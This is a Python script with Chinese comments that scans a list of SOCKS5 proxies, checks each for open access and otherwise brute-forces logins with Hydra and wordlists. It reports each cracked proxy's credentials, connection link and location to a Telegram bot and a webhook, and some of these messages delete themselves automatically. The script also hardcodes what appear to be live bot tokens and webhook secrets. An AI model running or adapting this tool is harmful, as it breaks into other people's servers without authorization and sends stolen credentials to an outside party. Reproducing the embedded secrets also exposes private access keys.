#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SOCKS5 代理扫描器 - 改进版
功能: 扫描并验证SOCKS5代理，支持无密和密码爆破
"""

import subprocess
import requests
import time
import socket
import socks
import re
import os
from datetime import datetime

# ================= 配置区域 =================
# 推荐使用环境变量，如果没有则使用默认值
TG_BOT_TOKEN = os.getenv("TG_BOT_TOKEN", "8517647551:AAEosyUg4hcmy1hy4mdiKoo-M9sg9ZqRSAY")
TG_CHAT_ID = os.getenv("TG_CHAT_ID", "6977085303")
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "https://wepush.yhe8714.workers.dev/wxsend")
WEBHOOK_AUTH = os.getenv("WEBHOOK_AUTH", "hy248624")

# 文件路径
SOCKS_FILE = "/root/s5/socks.txt"
USER_FILE = "/root/s5/users.txt"
PASS_FILE = "/root/s5/pass.txt"
LOG_FILE = "/root/s5/success_proxies.log"
STATUS_FILE = "/root/s5/monitor.status"

# 定时汇报间隔 (秒) - 6小时
HEARTBEAT_INTERVAL = 21600

# 验证参数
MIN_SPEED_THRESHOLD = 50  # 最低速度阈值(kb/s)，低于此值将被过滤
VERIFY_TIMEOUT = 5  # 验证超时时间(秒)
SPEED_TEST_TIMEOUT = 10  # 测速超时时间(秒)
# ===========================================


def update_status(message):
    """更新状态文件并打印日志"""
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    full_msg = f"[{now}] {message}"
    print(full_msg)
    try:
        with open(STATUS_FILE, "w", encoding="utf-8") as f:
            f.write(full_msg)
    except Exception as e:
        print(f"写入状态文件失败: {e}")


def send_webhook(title, content):
    """发送Webhook通知"""
    if not WEBHOOK_URL:
        return
    
    headers = {
        "Authorization": WEBHOOK_AUTH,
        "Content-Type": "application/json"
    }
    payload = {
        "title": title,
        "content": content,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    
    try:
        resp = requests.post(WEBHOOK_URL, headers=headers, json=payload, timeout=10)
        resp.raise_for_status()
    except requests.RequestException as e:
        print(f"Webhook发送失败: {e}")
    except KeyboardInterrupt:
        raise


def send_telegram(message, auto_delete=False):
    """
    发送Telegram通知
    auto_delete: 如果为True，10分钟后自动删除消息
    """
    if not TG_BOT_TOKEN or not TG_CHAT_ID:
        return None
    
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": TG_CHAT_ID,
        "text": message,
        "parse_mode": "HTML"
    }
    
    try:
        resp = requests.post(url, data=data, timeout=5)
        resp.raise_for_status()
        
        result = resp.json()
        message_id = result.get('result', {}).get('message_id')
        if auto_delete and message_id:
            # 10分钟后删除
            import threading

            def delete_message():
                time.sleep(600)  # 10分钟 = 600秒
                delete_telegram_message(message_id)

            # 启动删除线程
            threading.Thread(target=delete_message, daemon=True).start()

        return message_id
        
    except requests.RequestException as e:
        print(f"Telegram发送失败: {e}")
        return None
    except KeyboardInterrupt:
        raise


def delete_telegram_message(message_id):
    """删除Telegram消息"""
    if not TG_BOT_TOKEN or not TG_CHAT_ID or not message_id:
        return
    delete_url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/deleteMessage"
    delete_data = {
        "chat_id": TG_CHAT_ID,
        "message_id": message_id
    }
    try:
        requests.post(delete_url, data=delete_data, timeout=5)
    except requests.RequestException:
        pass


def send_periodic_report(current, total):
    """发送定时进度汇报"""
    percent = (current / total) * 100
    
    title = "📈 扫描进度汇报"
    content = f"当前进度: {current}/{total} ({percent:.2f}%)"
    
    tg_msg = (
        f"<b>【{title}】</b>\n"
        f"当前进度：<code>{current}</code> / <code>{total}</code>\n"
        f"完成比例：<code>{percent:.2f}%</code>"
    )
    
    update_status(f"⏰ 发送定时报告: {current}/{total}")
    send_telegram(tg_msg)
    send_webhook(title, content)


def get_ip_info(ip):
    """获取IP地理位置信息，带重试机制"""
    max_retries = 3
    for attempt in range(max_retries):
        try:
            url = f"http://ip-api.com/json/{ip}?lang=zh-CN"
            r = requests.get(url, timeout=5).json()
            
            if r.get('status') == 'success':
                return {
                    "country": r.get('country', '未知'),
                    "region": r.get('regionName', ''),
                    "city": r.get('city', ''),
                    "isp": r.get('isp', '未知')
                }
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(1)  # 重试前等待
                continue
            print(f"获取IP信息失败: {e}")
    
    return {"country": "未知", "region": "", "city": "", "isp": "未知"}


def check_no_auth(ip, port, log_prefix=""):
    """
    探测无密模式 - 增强版
    多重验证降低误报率
    """
    update_status(f"{log_prefix} 探测无密模式: {ip}:{port} ...")
    origin_sock = socket.socket
    
    try:
        socks.set_default_proxy(socks.SOCKS5, ip, int(port))
        socket.socket = socks.socksocket
        
        # 验证1: HTTP请求
        resp = requests.get("http://www.microsoft.com", timeout=3)
        
        # 检查是否返回认证错误
        if resp.status_code == 407:
            return False
        
        # 验证2: 尝试DNS解析（SOCKS5特性）
        try:
            socket.gethostbyname("www.google.com")
        except socket.error:
            return False
        
        return True
        
    except socks.ProxyConnectionError:
        return False
    except Exception:
        return False
    finally:
        socks.set_default_proxy()
        socket.socket = origin_sock


def verify_login(ip, port, user, password, log_prefix=""):
    """
    二次验证 - 增强版
    测试多个目标端口，降低误报率
    """
    origin_sock = socket.socket
    
    # 测试多个目标，提高可靠性
    test_targets = [
        ("8.8.8.8", 53),           # DNS
        ("1.1.1.1", 80),           # HTTP
        ("www.google.com", 443),   # HTTPS
    ]
    
    success_count = 0
    
    for target_host, target_port in test_targets:
        s = None
        try:
            s = socks.socksocket()
            s.set_proxy(socks.SOCKS5, ip, int(port), username=user, password=password)
            s.settimeout(VERIFY_TIMEOUT)
            s.connect((target_host, target_port))
            success_count += 1
        except Exception:
            pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass
            socket.socket = origin_sock
    
    # 至少成功2个测试才认为有效
    return success_count >= 2


def comprehensive_verify(ip, port, user=None, pwd=None, log_prefix=""):
    """
    综合验证 - 新增
    通过实际HTTP请求验证代理可用性
    """
    update_status(f"{log_prefix} 综合验证: {ip}:{port} ...")
    origin_sock = socket.socket
    
    try:
        # 设置代理
        if user and pwd:
            socks.set_default_proxy(socks.SOCKS5, ip, int(port), username=user, password=pwd)
        else:
            socks.set_default_proxy(socks.SOCKS5, ip, int(port))
        
        socket.socket = socks.socksocket
        
        # 实际HTTP请求验证
        resp = requests.get("http://httpbin.org/ip", timeout=VERIFY_TIMEOUT)
        
        # 检查响应状态
        if resp.status_code != 200:
            return False, f"HTTP错误: {resp.status_code}"
        
        # 尝试解析返回的IP（可选验证）
        try:
            data = resp.json()
            proxy_ip = data.get('origin', '').split(',')[0].strip()
            # 某些透明代理会暴露真实IP，但不影响使用
        except:
            pass
        
        return True, "验证通过"
        
    except requests.Timeout:
        return False, "请求超时"
    except requests.RequestException as e:
        return False, f"请求失败: {str(e)[:50]}"
    except Exception as e:
        return False, f"未知错误: {str(e)[:50]}"
    finally:
        socks.set_default_proxy()
        socket.socket = origin_sock


def test_proxy_speed(ip, port, user, password, log_prefix=""):
    """
    测试代理速度 - 改进版
    确保延迟和速度都测试成功
    """
    update_status(f"{log_prefix} 正在测速: {ip}:{port} ...")
    origin_sock = socket.socket
    
    try:
        # 设置代理
        if user and password:
            socks.set_default_proxy(socks.SOCKS5, ip, int(port), username=user, password=password)
        else:
            socks.set_default_proxy(socks.SOCKS5, ip, int(port))
        
        socket.socket = socks.socksocket
        
        # 测试1: 延迟
        start = time.time()
        resp1 = requests.get("http://www.microsoft.com", timeout=VERIFY_TIMEOUT)
        if resp1.status_code != 200:
            return None, None
        latency = (time.time() - start) * 1000
        
        # 测试2: 下载速度
        dl_start = time.time()
        resp2 = requests.get("https://speed.cloudflare.com/__down?bytes=500000", 
                            timeout=SPEED_TEST_TIMEOUT)
        if resp2.status_code != 200:
            return latency, None
        
        dl_time = time.time() - dl_start
        if dl_time <= 0:
            return latency, None
        
        speed = 500 / dl_time  # kb/s
        
        return latency, speed
        
    except requests.Timeout:
        return None, None
    except Exception:
        return None, None
    finally:
        socks.set_default_proxy()
        socket.socket = origin_sock


def format_speed(s):
    """格式化速度显示"""
    if s is None:
        return "N/A"
    if s > 5000:
        return f"{s:.2f} kb/s(起飞)"
    if s > 2000:
        return f"{s:.2f} kb/s(极快)"
    if s > 500:
        return f"{s:.2f} kb/s(流畅)"
    return f"{s:.2f} kb/s(一般)"


def run_hydra(ip, port, log_prefix="", current=0, total=0):
    """
    使用Hydra进行密码爆破 - 改进版
    增强结果验证，降低误报
    """
    update_status(f"{log_prefix} Hydra 正在爆破: {ip}:{port} ...")
    
    cmd = [
        "hydra",
        "-L", USER_FILE,
        "-P", PASS_FILE,
        "-s", port,
        "-t", "4",
        "-w", "1",
        "-I",  # 忽略已有会话
        f"socks5://{ip}"
    ]
    
    pending_message_id = None
    try:
        res = subprocess.run(
            cmd,
            capture_output=True,
            text=True
        )
        
        # 检查是否真的找到有效密码
        if "valid password found" in res.stdout.lower():
            match = re.search(r"login:\s+(\S+)\s+password:\s+(\S+)", res.stdout)
            if match:
                # 确保不是在错误消息中匹配到的
                matched_text = res.stdout[max(0, match.start()-20):match.end()+20]
                if "error" not in matched_text.lower() and "fail" not in matched_text.lower():
                    user = match.group(1)
                    pwd = match.group(2)
                    
                    # 发送爆破成功通知（10分钟后自动删除）
                    if current > 0 and total > 0:
                        progress_percent = (current / total) * 100
                        tg_msg = (
                            f"<b>【Hydra爆破成功】</b>\n"
                            f"IP：<code>{ip}</code>\n"
                            f"端口：<code>{port}</code>\n"
                            f"账号：<code>{user}</code>\n"
                            f"密码：<code>{pwd}</code>\n"
                            f"进度：{current}/{total} ({progress_percent:.1f}%)\n"
                            f"状态：等待二次验证...\n"
                            f"<i>💡 此消息10分钟后自动删除</i>"
                        )
                        pending_message_id = send_telegram(tg_msg, auto_delete=True)
                    
                    return user, pwd, "Success", pending_message_id
        
        return None, None, "未找到", pending_message_id
        
    except FileNotFoundError:
        return None, None, "Hydra未安装", pending_message_id
    except Exception as e:
        return None, None, str(e)[:50], pending_message_id


def validate_config():
    """验证配置和必需文件"""
    errors = []
    
    # 检查必需文件
    required_files = {
        SOCKS_FILE: "目标代理列表",
        USER_FILE: "用户名字典",
        PASS_FILE: "密码字典"
    }
    
    for filepath, desc in required_files.items():
        if not os.path.exists(filepath):
            errors.append(f"缺少必需文件: {filepath} ({desc})")
    
    # 检查通知配置
    if not TG_BOT_TOKEN:
        print("⚠️  警告: 未配置Telegram Bot Token，将无法发送TG通知")
    if not TG_CHAT_ID:
        print("⚠️  警告: 未配置Telegram Chat ID，将无法发送TG通知")
    if not WEBHOOK_URL:
        print("⚠️  警告: 未配置Webhook URL，将无法发送Webhook通知")
    
    # 如果有错误，抛出异常
    if errors:
        raise RuntimeError("\n".join(errors))
    
    update_status("✅ 配置验证通过")


def main():
    """主函数"""
    # 验证配置
    validate_config()
    
    # 读取目标列表
    try:
        with open(SOCKS_FILE, 'r', encoding='utf-8') as f:
            targets = [line.strip() for line in f if line.strip() and ":" in line]
    except Exception as e:
        update_status(f"❌ 读取目标文件失败: {e}")
        return
    
    if not targets:
        update_status("❌ 目标列表为空")
        return
    
    total = len(targets)
    update_status(f"🚀 任务启动: {total} 个目标")
    
    # 记录上次汇报时间
    last_report_time = time.time()
    success_count = 0
    
    for idx, target in enumerate(targets):
        current_num = idx + 1
        progress_str = f"[{current_num}/{total}]"
        progress_percent = (current_num / total) * 100
        
        # 检查是否需要发送定时报告（排除最后一个）
        if current_num < total and time.time() - last_report_time > HEARTBEAT_INTERVAL:
            send_periodic_report(current_num, total)
            last_report_time = time.time()
        
        # 解析IP和端口
        if ":" not in target:
            update_status(f"⚠️  {progress_str} 格式错误: {target}")
            continue
        
        ip, port = target.split(":", 1)
        user, pwd = None, None
        pending_message_id = None
        
        # ========== 第一步: 无密检测 ==========
        is_no_auth = check_no_auth(ip, port, log_prefix=progress_str)
        
        # ========== 第二步: 如果需要密码，尝试爆破 ==========
        if not is_no_auth:
            user, pwd, reason, pending_message_id = run_hydra(
                ip,
                port,
                log_prefix=progress_str,
                current=current_num,
                total=total
            )
            
            if not user or not pwd:
                update_status(f"⛔️ {progress_str} 爆破失败: {ip}:{port} ({reason})")
                time.sleep(0.5)  # 失败快速跳过
                continue
        
        # ========== 第三步: 二次验证（多目标测试）==========
        if not is_no_auth:
            update_status(f"{progress_str} 正在二次验证: {user}:{pwd} ...")
            if not verify_login(ip, port, user, pwd, log_prefix=progress_str):
                update_status(f"⚠️  {progress_str} 二次验证失败: {ip}:{port}")
                if pending_message_id:
                    delete_telegram_message(pending_message_id)
                time.sleep(1)
                continue
        
        # ========== 第四步: 综合验证（HTTP请求）==========
        verify_ok, verify_msg = comprehensive_verify(ip, port, user, pwd, log_prefix=progress_str)
        if not verify_ok:
            update_status(f"⚠️  {progress_str} 综合验证失败: {ip}:{port} ({verify_msg})")
            time.sleep(1)
            continue
        
        # ========== 第五步: 测速 ==========
        lat, speed = test_proxy_speed(ip, port, user, pwd, log_prefix=progress_str)
        
        # 检查延迟和速度是否都有效
        if lat is None or speed is None:
            update_status(f"❌ {progress_str} 测速失败: {ip}:{port}")
            time.sleep(1)
            continue
        
        # 速度过滤
        if speed < MIN_SPEED_THRESHOLD:
            update_status(f"⚠️  {progress_str} 速度过慢({speed:.2f}kb/s): {ip}:{port}")
            time.sleep(1)
            continue
        
        # ========== 通过所有验证，记录并通知 ==========
        show_u = user if user else "无"
        show_p = pwd if pwd else "无"
        
        # 获取IP信息
        info = get_ip_info(ip)
        
        # 构建连接链接
        if user and pwd:
            link_full = f"socks5://{user}:{pwd}@{ip}:{port}"
            tg_link_url = f"https://t.me/socks?server={ip}&port={port}&user={user}&pass={pwd}"
        else:
            link_full = f"socks5://{ip}:{port}"
            tg_link_url = f"https://t.me/socks?server={ip}&port={port}"
        
        # 格式化数据
        lat_str = f"{lat:.2f} ms"
        speed_str = format_speed(speed)
        
        # Telegram通知
        tg_msg = (
            f"<b>【获取到socks5】</b>\n"
            f"IP：<code>{ip}</code>\n"
            f"端口：<code>{port}</code>\n"
            f"账号：<code>{show_u}</code>\n"
            f"密码：<code>{show_p}</code>\n\n"
            f"<code>{link_full}</code>\n\n"
            f"<a href='{tg_link_url}'>TG一键连接链接</a>\n"
            f"延迟: {lat_str} | 下载速度: {speed_str}\n"
            f"进度: {current_num}/{total} ({progress_percent:.1f}%)\n"
            f"【归属地：{info['country']} {info['region']} {info['city']}】-【运营商：{info['isp']}】"
        )
        
        # Webhook通知
        webhook_content = (
            f"节点: {link_full}\n"
            f"延迟: {lat_str} | 速度: {speed_str}\n"
            f"进度: {current_num}/{total}"
        )
        
        # 写入日志文件
        try:
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(link_full + "\n")
        except Exception as e:
            print(f"写入日志失败: {e}")
        
        # 发送通知
        update_status(f"✅ {progress_str} 成功: {ip}:{port}")
        send_telegram(tg_msg)
        send_webhook(f"捕获SOCKS5: {ip}", webhook_content)
        
        success_count += 1
        
        # 成功后冷却
        update_status(f"⏳ {progress_str} 冷却 2s...")
        time.sleep(2)
    
    # ========== 任务完成 ==========
    send_periodic_report(total, total)
    update_status(f"🎉 所有任务已完成。成功: {success_count}/{total}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        update_status("⚠️  用户手动中断")
        print("\n程序已被用户中断")
    except Exception as e:
        update_status(f"❌ 程序异常: {e}")
        print(f"发生错误: {e}")
        raise
